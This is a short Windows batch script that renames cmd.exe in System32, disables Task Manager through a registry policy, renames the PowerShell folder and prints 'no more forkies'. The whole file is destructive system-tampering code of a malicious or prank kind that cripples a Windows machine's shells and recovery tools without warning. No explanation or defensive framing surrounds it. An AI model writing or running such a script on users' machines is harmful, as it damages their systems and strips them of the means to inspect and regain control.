@echo off
c:
cd \
cd windows
cd system32
ren cmd.exe test.exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" ^
 /v DisableTaskMgr /t REG_DWORD /d 1 /f
ren WindowsPowerShell Powershell
echo no more forkies
pause
@echo on
